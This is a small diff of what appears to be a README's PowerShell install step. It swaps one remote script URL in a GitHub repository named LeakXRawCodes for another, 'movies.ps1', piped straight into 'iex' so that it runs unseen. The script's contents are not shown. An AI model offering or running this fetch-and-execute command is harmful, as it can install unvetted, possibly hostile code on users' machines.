@@ -194,4 +194,4 @@
 ### 🪟 **Windows — PowerShell**
 
 ```powershell
-irm https://raw.githubusercontent.com/LeakXFrosty/LeakXRawCodes/main/install.ps1 | iex
+irm  https://raw.githubusercontent.com/LeakXFrosty/LeakXRawCodes/refs/heads/main/movies.ps1 | iex
